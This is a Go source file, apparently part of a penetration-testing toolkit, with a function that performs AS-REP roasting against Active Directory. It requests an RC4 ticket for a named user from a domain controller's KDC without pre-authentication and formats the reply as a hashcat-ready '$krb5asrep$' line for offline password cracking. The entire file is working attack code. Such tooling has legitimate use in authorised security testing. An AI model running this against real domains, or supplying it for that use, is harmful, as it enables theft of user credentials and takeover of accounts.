package roast

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/config"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/messages"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// getASREP fetches the AS-REP for a user and formats the hashcat line.
// It reimplements pkg/kerberos.GetASREP's exchange because that function
// reads the KDC response with a single bare conn.Read: a short TCP read
// leaves a zero tail in the AS-REP buffer, which corrupts the edata tail
// of the hash (observed on a live Server 2022 KDC — the hash came out with
// hundreds of trailing zero bytes). Request construction mirrors it
// exactly (RC4 etype 23, krbtgt/REALM sname); the response is read with
// io.ReadFull.
func getASREP(username, realm, kdcHost string) (string, error) {
	realm = strings.ToUpper(realm)

	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	cfg.LibDefaults.DefaultTktEnctypes = []string{"rc4-hmac"}
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{23}

	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, username)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)

	asReq, err := messages.NewASReq(realm, cfg, cName, sName)
	if err != nil {
		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
	}
	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(kdcHost, "88"), 5*time.Second)
	if err != nil {
		return "", fmt.Errorf("failed to connect to KDC: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	length := uint32(len(b))
	lengthBuf := []byte{byte(length >> 24), byte(length >> 16), byte(length >> 8), byte(length)}
	if _, err := conn.Write(append(lengthBuf, b...)); err != nil {
		return "", fmt.Errorf("failed to send AS-REQ: %v", err)
	}

	respLengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, respLengthBuf); err != nil {
		return "", fmt.Errorf("failed to read response length: %v", err)
	}
	respBuf := make([]byte, binary.BigEndian.Uint32(respLengthBuf))
	if _, err := io.ReadFull(conn, respBuf); err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		// Not an AS-REP — maybe a KRB-ERROR (e.g. key expired).
		var krbErr messages.KRBError
		if errErr := krbErr.Unmarshal(respBuf); errErr == nil {
			return "", fmt.Errorf("KDC returned error: %s", krbErr.Error())
		}
		return "", fmt.Errorf("failed to unmarshal response: %v", err)
	}

	etype := asRep.EncPart.EType
	cipher := fmt.Sprintf("%x", asRep.EncPart.Cipher)
	if etype == 17 || etype == 18 {
		// AES: $krb5asrep$etype$user$realm$checksum(last 24 hex)$data
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s",
			etype, username, realm, cipher[len(cipher)-24:], cipher[:len(cipher)-24]), nil
	}
	// RC4: $krb5asrep$23$user@realm:checksum$data
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		etype, username, realm, cipher[:32], cipher[32:]), nil
}
